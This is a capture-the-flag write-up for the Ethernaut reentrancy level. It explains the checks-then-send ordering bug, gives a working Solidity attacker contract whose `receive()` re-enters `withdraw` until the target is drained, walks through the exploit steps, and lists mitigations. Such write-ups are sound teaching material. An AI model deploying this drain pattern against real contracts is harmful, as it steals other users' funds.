# Ethernaut #10 — Re-entrancy

## Objective

Steal all the funds from the `Reentrance` contract.

## Vulnerability: Reentrancy

`withdraw` checks the caller's recorded balance, sends the ETH with a low-level call, and only then reduces the recorded balance:

1. Check that `balances[msg.sender] >= _amount`.
2. Send `_amount` of ETH to the caller.
3. Subtract `_amount` from `balances[msg.sender]`.

Step 2 hands control to the recipient. If the recipient is a contract, its `receive()` runs before step 3, so it can call `withdraw` again while its recorded balance is still unchanged. The same balance passes the same check again, and ETH keeps leaving the contract.

## Root Cause

The contract gives control to an untrusted party before its own accounting is up to date. The bug lives in the gap between two numbers: what the contract actually holds, and what it has recorded about each user. During the external call, those two numbers disagree, and the check trusts the stale one.

## Attack Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address) external payable;
    function balanceOf(address) external returns(uint256);
    function withdraw(uint256) external;
}

contract RAttack {
    // Address of my Ethernaut instance. Replace with yours.
    address immutable target = 0xa76b4A142c94b585F28cE23BD336cB0775013bda;
    uint256 amt = 0.001 ether;

    // Must be called with at least `amt` of ETH attached. The drained ETH
    // stays in this contract (no withdraw function; testnet only).
    function attack() external payable {
        bytes memory payload = abi.encodeWithSignature("donate(address)", address(this));
        (bool success ,) = target.call{value: amt}(payload);
        require(success, "donation failed");
        IReentrance(target).withdraw(amt);
    }

    receive() external payable {
        uint256 bal = address(target).balance;
        if (bal >= amt) {
            IReentrance(target).withdraw(amt);
        } else return;
    }
}
```

## Exploit

1. Read the instance's balance. Mine held 0.001 ETH.
2. Donate to the attacker contract's own address, so it has a recorded balance. I donated 0.001 ETH, equal to the instance's balance.
3. Call `withdraw(0.001)`. The check passes, and the instance sends the ETH to the attacker, triggering `receive()`.
4. `receive()` calls `withdraw(0.001)` again. The recorded balance hasn't changed yet, so the check passes again and a second 0.001 ETH leaves.
5. After the second send, the instance holds 0, so `receive()` sees that its balance is below the chunk and stops.
6. The nested calls unwind. The innermost `-=` runs first, taking the recorded balance from 0.001 to 0. The outer `-=` then subtracts 0.001 from 0.
7. Verify that the instance now holds 0 ETH, then submit.

**On the chunk size.** My first version used 0.01 ETH and never re-entered: after the first withdrawal the instance held less than 0.01, so `receive()` returned without calling again, and I only got my own donation back. The chunk has to fit the balance left in the instance, and it can't be larger than what I donated, since the check uses my recorded balance. A bigger target would need either a larger donation or smaller chunks with more nested calls, which costs gas and runs into depth limits.

## Why the Compiler Version Matters

Step 6 subtracts 0.001 from a recorded balance of 0. On Solidity 0.6.x, that wraps around silently into an enormous number instead of reverting. 

I checked balanceOf for the attacker on the instance and it returned **115792089237316195423570985008687907853269984665640564039457583007913129639936**, which is 2^256 − 10^15 wei, exactly what a silent underflow of 0.001 ETH produces.

On Solidity 0.8 and later, that subtraction would revert, which would undo the entire transaction, including the drained ETH. So this exact attack depends on silent underflow. The ordering bug itself is a bug on every version: a variant that sets the balance to zero after the call, instead of subtracting, would still be drainable on a modern compiler.

## Impact

An attacker with a small recorded balance can drain every other user's funds from the contract, limited only by gas and call depth.

## Key Takeaways

- Giving control to an external contract before updating your own state lets that contract act on stale state.
- What the contract holds and what it has recorded can disagree during an external call, and checks must not trust the stale number.
- A recipient contract's `receive()` is attacker-controlled code that runs in the middle of your function.
- Nested calls unwind in reverse: the innermost state update runs first.
- Compiler version changes what a bug does. It doesn't change whether the bug is there.

## Mitigation

- **Checks-effects-interactions:** update the balance before sending the ETH. If the balance is reduced first, a re-entering call fails the check.
- **A reentrancy guard** (for example OpenZeppelin's `nonReentrant`) blocks nested calls into the function outright, as a second line of defence.
- **Pull payments** keep external calls out of state-changing logic.
- **Upgrading the compiler is not a fix by itself.** It stops this exact underflow variant but not the reentrancy.